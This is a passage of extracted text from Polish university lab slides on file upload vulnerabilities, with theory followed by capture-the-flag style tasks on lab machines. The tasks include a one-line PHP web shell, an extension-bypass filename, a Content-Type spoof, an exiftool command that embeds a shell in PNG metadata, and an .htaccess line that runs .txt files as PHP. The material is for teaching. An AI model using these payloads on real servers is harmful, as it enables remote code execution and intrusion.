s32924 2026-06-21 17:36:37
```

### Strona 5 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyna WEB - FILE UPLOAD jest włączona.
  Jeżeli  coś  się  zepsuje, w  każdej  chwili możesz  ją  przywrócić do  stanu
  początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego panelu, którego lokalizacja znajduje
                                                                                                                                                                              5
s32924się2026-06-21w treści17:36:37zadania.
```

### Strona 6 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              6
s32924 2026-06-21 17:36:37
```

### Strona 7 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              7
s32924 2026-06-21 17:36:37
```

### Strona 8 / 28

#### Tekst

```text
                   UPLOAD PLIKÓW                                                                                                                                                            PJA.EDU.PL


         Teoria
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:37
```

### Strona 9 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Błędy w implementacji mechanizmu uploadu plików

  Błędy przy implementacji mechanizmu uploadu plików w aplikacjach webowych
  mogą prowadzić do poważnych luk bezpieczeństwa. Jednym z najczęstszych
  problemów jest brak odpowiedniej weryfikacji typu pliku, co pozwala atakującym
  na przesyłanie nieautoryzowanych lub złośliwych plików, takich jak skrypty PHP
  czy pliki wykonywalne. Innym błędem jest niewłaściwe zarządzanie nazwami
  plików, co może umożliwić nadpisywanie istniejących plików lub manipulowanie
  strukturą katalogów. Wiele aplikacji nie sprawdza również rzeczywistej zawartości
  pliku, co może pozwolić na upload plików z niepoprawnymi lub zmienionymi
  rozszerzeniami.


                                                                                                                                                                              9
s32924 2026-06-21 17:36:37
```

### Strona 10 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Błędy w implementacji mechanizmu uploadu plików

  Niedostateczne ograniczenia dotyczące rozmiaru plików mogą prowadzić do
  ataków DoS (Denial of Service), gdzie serwer zostaje przeciążony dużymi plikami.
  Brak  odpowiednich  uprawnień  do  zapisu  lub  odczytu w  katalogach
  przeznaczonych na pliki uploadowane może prowadzić do nieautoryzowanego
  dostępu do wrażliwych danych. Innym ryzykiem jest niewłaściwe ustawienie praw
  dostępu do uploadowanych plików, co może umożliwić ich wykonanie lub odczyt
  przez osoby trzecie.


                                                                                                                                                                            10
s32924 2026-06-21 17:36:37
```

### Strona 11 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Błędy w implementacji mechanizmu uploadu plików

  Ważne jest także, aby mechanizm uploadu plików nie pozwalał na przesyłanie
  plików  do  nieznanych   lokalizacji,  co  może  prowadzić  do  problemów
  z bezpieczeństwem  i zarządzaniem danymi. Warto również stosować techniki
  takie jak skanowanie plików w celu wykrywania złośliwego oprogramowania oraz
  regularne aktualizowanie  aplikacji   i  jej komponentów w celu eliminowania
  znanych luk bezpieczeństwa. Dobrą praktyką  jest także stosowanie limitów
  dotyczących liczby plików, które można przesłać w jednym żądaniu, aby uniknąć
  nadużyć i problemów z wydajnością.


                                                                                                                                                                            11
s32924 2026-06-21 17:36:37
```

### Strona 12 / 28

#### Tekst

```text
                   UPLOAD PLIKÓW                                                                                                                                                            PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:37
```

### Strona 13 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.1: RCE

  Celem zadania jest upload pliku php, który pozwoli na wykonywanie poleceń
  systemowych w tym wylistowanie plików i odczyt flagi.


  http://192.168.100.14/site1/


  Plik (shell.php):

  <?php
  system($_GET["x"]);


                                                                                                                                                                            13
s32924 2026-06-21 17:36:37
```

### Strona 14 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.1: RCE

  Ścieżka do flagi:
  /flag14.1.txt


                                                                                                                                                                         RCE


                                                                                                                                                                            14
s32924 2026-06-21 17:36:37
```

### Strona 15 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2: Path Traversal

  Celem  zadania  jest upload  pliku  php,  który  pozwoli na wykonanie kodu
  na serwerze w tym wylistowanie plików i odczyt flagi.
  Skrypt uploaduje plik w nieznanym miejscu.
  Należy wykorzystać podatność Path Traversal, aby zmienić katalog, w którym
  zostanie umieszczony uploadowany plik.


  URL:
  http://192.168.100.14/site2/


                                                                                                                                                                            15
s32924 2026-06-21 17:36:37
```

### Strona 16 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2: Path Traversal


                                                                                                                                                                            16
s32924 2026-06-21 17:36:37
```

### Strona 17 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2: Path Traversal


                                                                                                                                                                            17
s32924 2026-06-21 17:36:37
```

### Strona 18 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2: Path Traversal

  Ścieżka do flagi:
  /flag14.2.txt


                                                                                                                                                                                      Path Traversal


                                                                                                                                                                            18
s32924 2026-06-21 17:36:37
```

### Strona 19 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.3: Biała lista

  Celem  zadania  jest upload  pliku  php,  który  pozwoli na wykonanie kodu
  na serwerze w tym wylistowanie plików i odczyt flagi.
  Strona weryfikuje, czy nazwa pliku zawiera ciąg znaków '.png’.
  Zabezpieczenie można oszukać, nazywając plik „shell.png.php”


  URL:
  http://192.168.100.14/site3/


                                                                                                                                                                            19
s32924 2026-06-21 17:36:37
```

### Strona 20 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.3: Biała lista

  Ścieżka do flagi:
  /flag14.3.txt


                                                                                                                                                                                                                                        Biała lista


                                                                                                                                                                            20
s32924 2026-06-21 17:36:37
```

### Strona 21 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.4: Nagłówek HTTP

  Celem zadania jest upload pliku php, który pozwoli na wylistowanie plików
    i odczyt flagi.
  Serwer  weryfikuje  pole  Content-Type w  zapytaniu  -  należy  je  ustawić
  np. na ”image/png”.


  URL:
  http://192.168.100.14/site4/


                                                                                                                                                                            21
s32924 2026-06-21 17:36:37
```

### Strona 22 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.4: Nagłówek HTTP


                                                                                                                                                                            22
s32924 2026-06-21 17:36:37
```

### Strona 23 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.4: Nagłówek HTTP

  Ścieżka do flagi:
  /flag14.4.txt


                                                                                                                                                                       Nagłówek HTTP


                                                                                                                                                                            23
s32924 2026-06-21 17:36:37
```

### Strona 24 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.5: Nagłówek pliku

  Celem zadania jest upload pliku php, który pozwoli na wylistowanie plików
    i odczyt flagi.
 Tym razem plik musi zostać wykryty jako obrazek na podstawie struktury pliku.


  URL:
  http://192.168.100.14/site5/


                                                                                                                                                                            24
s32924 2026-06-21 17:36:37
```

### Strona 25 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.5: Nagłówek pliku

  Zadanie można rozwiązać umieszczając kod php w metadanych prawdziwego
  obrazka:


  locate png #znalezienie przykładowego obrazka
  cp /var/lib/inetsim/http/fakefiles/sample.png . #skopiowanie go
  exiftool -comment='<?php system($_GET["x"]); ?>' sample.png #edycja metadanych
  cp sample.png sample.php #zmiana rozszerzenia na .php


                                                                                                                                                                            25
s32924 2026-06-21 17:36:37
```

### Strona 26 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.5: Nagłówek pliku
  Ścieżka do flagi:
   /flag14.5.txt


                                                                                                                                                                      Nagłówek pliku


                                                                                                                                                                            26
s32924 2026-06-21 17:36:37
```

### Strona 27 / 28

#### Tekst

```text
                    UPLOAD PLIKÓW                                                                         POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
 OWASP File Upload Cheat Sheet

  https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/
 SANS Institute - Secure File Upload

  https://cwe.mitre.org/data/definitions/434.html
  CWE-434: Unrestricted Upload of File with Dangerous Type


                                                                                                                                                                            27
s32924 2026-06-21 17:36:37
```

### Strona 28 / 28

#### Tekst

```text
                   UPLOAD PLIKÓW                                                                                                                                                            PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:37
```

---

## 12. 14p. File upload PENTEST (2)(2).pdf

Liczba stron: 14


### Strona 1 / 14

#### Tekst

```text
                   UPLOAD PLIKÓW | PENTEST                                                                                                                                                  PJA.EDU.PL
     Upload plików

        Pentest
                        KOMPUTEROWYCH                         Zajęcia nr 14
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
                                                                                         Powered by HackingDept platform
s32924 2026-06-21 17:36:35
```

### Strona 2 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Spis treści


                               PRZYGOTOWANIE ŚRODOWISKA
                                                     Uruchamianie maszyn ………………………….……… 4
                                                         Połączenie OpenVPN …………………………………… 5

                                ZADANIA
                                                    14.1p .htaccess ……………………………….…..…….  8
                                                    14.2p RCE..……….…………………….……………..…… 11


                                                                                                                                                                              2
s32924 2026-06-21 17:36:35
```

### Strona 3 / 14

#### Tekst

```text
                   UPLOAD PLIKÓW | PENTEST                                                                                                                                                  PJA.EDU.PL

     Przygotowanie
      środowiska                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:35
```

### Strona 4 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Uruchamianie maszyn

  Przed rozpoczęciem upewnij się, że maszyny WEB - FILE UPLOAD oraz WEB - FILE
  UPLOAD PENTEST są włączone. Jeżeli coś się zepsuje, w każdej chwili możesz ją
  przywrócić do stanu początkowego.


  Wszystkie zadania rozwiązujemy za pomocą przygotowanego panelu, którego lokalizacja
                                                                                                                                                                              4
s32924znajduje2026-06-21 17:36:35się w treści zadania.
```

### Strona 5 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Połączenie OpenVPN

  Połączenie OpenVPN jest niezbędne do rozwiązania zadań.
  Aby połączyć się z siecią VPN, należy pobrać  plik konfiguracyjny OpenVPN
  z rozwijanego menu „VPNy” na stronie głównej.
  Następnie należy wykonać komendę:

 sudo openvpn /sciezka/do/pliku.ovpn


                                                                                                                                                                              5
s32924 2026-06-21 17:36:35
```

### Strona 6 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Niezaliczone zadanie
  Niektóre rozwiązane zadania powinny zaliczać się w systemie automatycznie.
  Jeśli jednak pojawi się problem i któreś z zadań rozwiążesz prawidłowo, a nadal
  będzie ono widnieć jako nierozwiązane, możesz odwiedzić podstronę /status na
  maszynie zadaniowej. Tam widnieć będzie flaga, którą możesz wkleić w swoim
  panelu i zaliczyć zadanie „ręcznie”.


                                                                                                                                                                              6
s32924 2026-06-21 17:36:35
```

### Strona 7 / 14

#### Tekst

```text
                   UPLOAD PLIKÓW | PENTEST                                                                                                                                                  PJA.EDU.PL


        Zadania
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:35
```

### Strona 8 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.1p: .htaccess

  Celem  zadania  jest  upload  pliku,  który  pozwoli  na  zmianę  konfiguracji
  serwera Apache2.
  Skrypt nie pozwala na upload plików z "php" w nazwie.
  Zadanie można rozwiązać uploadując plik .htaccess  i np. dodając handler PHP
  do plików .txt


  URL:
  http://192.168.100.64/


                                                                                                                                                                              8
s32924 2026-06-21 17:36:35
```

### Strona 9 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.1p: .htaccess

  .htaccess:

  AddType application/x-httpd-php .txt


  Powyższa linijka spowoduje, że wszystkie pliki .txt w katalogu będą traktowane
  jako skrypty PHP!


                                                                                                                                                                              9
s32924 2026-06-21 17:36:35
```

### Strona 10 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.1p: .htaccess

  Zadanie zostanie zaliczone automatycznie.


                                                                                                                                                             .htaccess


                                                                                                                                                                            10
s32924 2026-06-21 17:36:35
```

### Strona 11 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2p: Czarna lista

  Celem  zadania  jest  upload  pliku,  który  pozwoli  na  wylistowanie  plików
    i odczyt flagi.
  Skrypt nie pozwala na upload plików z "php" w nazwie.
  Należy wykorzystać możliwość uploadu plików  .txt, które  teraz traktowane
  są jako skrypty PHP.


                                                                                                                                                                            11
s32924 2026-06-21 17:36:35
```

### Strona 12 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Zadanie 14.2p: Czarna lista

  Flaga znajduje się w katalogu /.


                                                                                                                                                                                            Czarna lista


                                                                                                                                                                            12
s32924 2026-06-21 17:36:35
```

### Strona 13 / 14

#### Tekst

```text
                    UPLOAD PLIKÓW | PENTEST                                                               POLSKO-JAPOŃSKA AKADEMIA TECHNIK KOMPUTEROWYCH                                         PJA.EDU.PL

 Referencje

  https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
  OWASP File Upload Cheat Sheet

  https://www.sans.org/blog/8-basic-rules-to-implement-secure-file-uploads/
  SANS Institute - Secure File Upload

  https://cwe.mitre.org/data/definitions/434.html
  CWE-434: Unrestricted Upload of File with Dangerous Type


                                                                                                                                                                            13
s32924 2026-06-21 17:36:35
```

### Strona 14 / 14

#### Tekst

```text
                   UPLOAD PLIKÓW | PENTEST                                                                                                                                                  PJA.EDU.PL


       Koniec ćwiczeń
                        KOMPUTEROWYCH
             TECHNIK
               AKADEMIA
                           POLSKO-JAPOŃSKA
s32924 2026-06-21 17:36:35
```

---
